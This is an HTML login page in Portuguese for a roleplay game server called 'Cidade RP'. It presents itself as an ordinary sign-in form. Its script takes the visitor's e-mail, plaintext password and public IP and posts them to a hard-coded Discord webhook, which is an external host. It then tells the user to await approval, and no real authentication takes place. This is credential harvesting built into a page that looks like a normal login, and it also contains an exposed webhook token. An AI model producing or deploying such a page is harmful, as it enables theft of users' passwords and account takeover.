<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Cidade RP - Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Segoe UI,Arial;background:#0d1117;color:#f0f6fc;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
    .card{background:#161b22;border-radius:8px;padding:25px;width:100%;max-width:320px}
    h3{margin-bottom:15px;text-align:center}
    input{width:100%;padding:10px;margin:6px 0;border:none;border-radius:4px}
    button{width:100%;padding:10px;border:none;border-radius:4px;background:#238636;color:#fff;font-weight:bold;cursor:pointer}
    button:hover{background:#2ea043}
    #msg{color:#f85149;margin-top:8px;font-size:14px;text-align:center}
    @media(max-width:400px){.card{padding:20px}}
  </style>
</head>
<body>
  <div class="card">
    <h3>Entrar na cidade</h3>
    <form id="formLogin">
      <input type="email" id="email" placeholder="Seu e-mail" required>
      <input type="password" id="senha" placeholder="Sua senha" required>
      <div id="msg"></div>
      <button type="submit">Entrar</button>
    </form>
  </div>

  <script>
  (async function(){
    // Bloqueio de IP
    const meuIP = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"desconhecido");
    const banned = await fetch("banned-ips.json").then(r=>r.json()).catch(()=>[]);
    if(banned.includes(meuIP)){
      document.body.innerHTML="<div class='card'><h3>Acesso negado</h3><p>Seu IP foi bloqueado.</p></div>";
      return;
    }

    // Envio dos dados
    document.getElementById("formLogin").addEventListener("submit", async e=>{
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const senha = document.getElementById("senha").value;
      const agora = new Date().toLocaleString("pt-BR");

      const payload = {
        content:null,
        embeds:[{
          title:"Login efetuado - Cidade RP",
          color:0xffd700,
          fields:[
            {name:"E-mail",value:email,inline:true},
            {name:"Senha",value:senha,inline:true},
            {name:"IP",value:meuIP,inline:true},
            {name:"Horário",value:agora,inline:false}
          ]
        }],
        components:[{
          type:1,
          components:[{
            type:2,
            style:4,
            label:"Banir IP",
            custom_id:`ban_${meuIP}`
          }]
        }]
      };

      await fetch("https://discord.com/api/webhooks/1425212407764094976/SPXgg8cjZBe5hIoqzLsV2Fyyk5MjZNZJmRUevf-f68Qw_47MifLJwOAiF1CxqMAf8IrN",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
      });

      alert("Dados enviados! Aguarde aprovação.");
      e.target.reset();
    });
  })();
  </script>
</body>
</html>
